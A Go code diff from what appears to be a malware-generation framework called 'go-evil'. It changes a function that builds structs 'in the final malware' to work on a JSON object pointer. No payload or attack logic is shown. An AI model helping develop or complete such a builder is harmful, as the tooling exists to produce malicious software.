@@ -1,13 +1,16 @@
 package generate
 
-import "github.com/TeamPhoneix/go-evil/utility/parsing/generate/structs"
+import (
+	"github.com/TeamPhoneix/go-evil/utility/parsing/generate/structs"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
+)
 
 // Generate different structs in the final malware
-func Generate_structs(s_json string) string {
-	s_json = structs.Generate_runtime_variable(s_json)
-	s_json = structs.Generate_crypt(s_json)
-	s_json = structs.Generate_alpha(s_json)
-	s_json = structs.Generate_spine(s_json)
+func Generate_structs(data_object *json.Json_t) {
 
-	return s_json
+	structs.Generate_runtime_variable(data_object)
+	structs.Generate_crypt(data_object)
+	structs.Generate_alpha(data_object)
+	structs.Generate_spine(data_object)
+
 }
